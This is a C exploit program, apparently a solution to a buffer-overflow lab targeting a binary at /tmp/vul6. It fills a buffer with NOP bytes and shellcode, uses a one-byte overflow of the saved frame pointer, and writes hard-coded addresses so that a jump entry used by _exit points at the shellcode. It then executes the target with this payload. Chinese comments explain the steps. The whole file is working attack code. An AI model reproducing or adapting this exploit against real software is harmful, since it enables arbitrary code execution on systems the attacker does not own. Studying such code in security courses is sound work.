#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul6"

int main(void)
{
    char payload[201];
    memset(payload, 0x90, 200);
    //! 溢出 ebp 的后两位为 0
    payload[200] = 0;
    //! 通过溢出，使指针 p 指向 _exit 函数中的 jmp 的地址
    //! 并将其指向 shellcode 的地址
    unsigned int new_ebp = 0xffffdd00;
    unsigned int buf = 0xffffdcb0;
    unsigned int jmp_addr = 0x804a00c;
    
    memcpy(payload + new_ebp - buf - 4, &jmp_addr, 4);
    memcpy(payload + new_ebp - buf - 8, &buf, 4);
    memcpy(payload, shellcode, strlen(shellcode));

    char *args[] = {TARGET, payload, NULL};
    char *env[] = {NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
